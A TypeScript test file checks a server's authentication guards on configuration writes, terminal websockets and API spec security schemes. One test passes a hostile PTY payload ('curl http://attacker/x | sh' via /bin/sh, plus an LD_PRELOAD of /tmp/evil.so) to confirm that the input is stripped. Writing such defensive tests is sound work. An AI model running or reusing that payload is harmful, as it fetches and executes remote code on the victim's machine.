import { expect, test } from "bun:test"
import { Hono } from "hono"
import { privilegedMutation } from "./transport-security"
import { Pty } from "../pty"

const app = new Hono().patch("/config", privilegedMutation, (c) => c.json({ ok: true }))

test("an unauthenticated HTTP caller cannot write configuration", async () => {
  const response = await app.request("http://127.0.0.1:4096/config", {
    method: "PATCH",
    headers: { host: "127.0.0.1:4096" },
  })
  expect(response.status).toBe(403)
})

test("the in-process interface is still allowed to write configuration", async () => {
  const response = await app.request("http://dax.internal/config", { method: "PATCH" })
  expect(response.status).toBe(200)
})

test("PTY creation no longer accepts a command, arguments or environment", () => {
  const parsed = Pty.CreateInput.parse({
    cwd: "/tmp",
    title: "t",
    command: "/bin/sh",
    args: ["-c", "curl http://attacker/x | sh"],
    env: { LD_PRELOAD: "/tmp/evil.so" },
  })
  expect(parsed).toEqual({ cwd: "/tmp", title: "t" })
})

test("operator credentials are checked by the mutation guard itself", async () => {
  const Secrets = await import("../secrets/secrets-loader")
  const { spyOn } = await import("bun:test")
  const secret = spyOn(Secrets, "getSecrets").mockResolvedValue({ serverPassword: "owned-test-password" } as never)
  try {
    for (const authorization of [undefined, `Basic ${btoa("dax:wrong-password")}`]) {
      const response = await app.request("http://127.0.0.1:4096/config", {
        method: "PATCH",
        headers: { host: "127.0.0.1:4096", ...(authorization ? { authorization } : {}) },
      })
      expect(response.status).toBe(401)
    }
    expect(
      (
        await app.request("http://127.0.0.1:4096/config", {
          method: "PATCH",
          headers: { host: "127.0.0.1:4096", authorization: `Basic ${btoa("dax:owned-test-password")}` },
        })
      ).status,
    ).toBe(200)
    expect((await app.request("http://dax.internal/config", { method: "PATCH" })).status).toBe(200)
  } finally {
    secret.mockRestore()
  }
})

test("real server refuses every unauthenticated HTTP write before route effects", async () => {
  const Secrets = await import("../secrets/secrets-loader")
  const { Server } = await import("./server")
  const { spyOn } = await import("bun:test")
  const secret = spyOn(Secrets, "getSecrets").mockResolvedValue({ serverPassword: undefined } as never)
  try {
    for (const method of ["POST", "PATCH", "PUT", "DELETE"]) {
      const response = await Server.App().request("http://127.0.0.1:4096/global/health", {
        method,
        headers: { host: "127.0.0.1:4096" },
      })
      expect(response.status).toBe(403)
    }
    expect(
      (
        await Server.App().request("http://127.0.0.1:4096/global/health", {
          headers: { host: "127.0.0.1:4096" },
        })
      ).status,
    ).toBe(200)
    expect((await Server.App().request("http://dax.internal/global/health", { method: "POST" })).status).toBe(404)
    secret.mockResolvedValue({ serverPassword: "owned-test-password" } as never)
    expect(
      (
        await Server.App().request("http://127.0.0.1:4096/global/health", {
          method: "POST",
          headers: { host: "127.0.0.1:4096", authorization: `Basic ${btoa("dax:wrong")}` },
        })
      ).status,
    ).toBe(401)
    expect(
      (
        await Server.App().request("http://127.0.0.1:4096/global/health", {
          method: "POST",
          headers: { host: "127.0.0.1:4096", authorization: `Basic ${btoa("dax:owned-test-password")}` },
        })
      ).status,
    ).toBe(404)
    expect((await Server.App().request("http://dax.internal/global/health", { method: "POST" })).status).toBe(404)
  } finally {
    secret.mockRestore()
  }
})

test("unauthenticated terminal websocket control cannot bypass the HTTP write guard", async () => {
  const Secrets = await import("../secrets/secrets-loader")
  const { PtyRoutes } = await import("./routes/pty")
  const { spyOn } = await import("bun:test")
  const secret = spyOn(Secrets, "getSecrets").mockResolvedValue({ serverPassword: undefined } as never)
  const lookup = spyOn(Pty, "get").mockImplementation(() => {
    throw new Error("terminal lookup must not be reached")
  })
  try {
    const response = await PtyRoutes().request("http://127.0.0.1:4096/owned/connect", {
      headers: { host: "127.0.0.1:4096", upgrade: "websocket" },
    })
    expect(response.status).toBe(403)
    expect(lookup).not.toHaveBeenCalled()
  } finally {
    lookup.mockRestore()
    secret.mockRestore()
  }
})

test("exported API describes operator credentials and guard errors", async () => {
  const { Server } = await import("./server")
  const spec = await Server.openapi()
  expect(spec.components?.securitySchemes?.operatorBasic).toMatchObject({ type: "http", scheme: "basic" })
  for (const [route, method] of [
    ["/runs/{runID}/grant-review/start", "post"],
    ["/permission/{requestID}/reply", "post"],
    ["/pty/{ptyID}/connect", "get"],
  ] as const) {
    const operation = spec.paths?.[route]?.[method]
    expect(operation?.security).toEqual([{ operatorBasic: [] }])
    expect(operation?.responses?.["401"]).toBeDefined()
    expect(operation?.responses?.["403"]).toBeDefined()
  }
})

test("repeated API generation retains referenced response definitions", async () => {
  const { Server } = await import("./server")
  for (let index = 0; index < 2; index++) {
    const spec = await Server.openapi()
    expect(spec.components?.schemas?.RunBadRequestError).toMatchObject({
      properties: { error: { type: "array" }, success: { const: false } },
    })
    expect(JSON.stringify(spec.paths?.["/runs/{runID}/grant-review/start"]?.post?.responses?.["400"])).toContain("RunBadRequestError")
  }
})
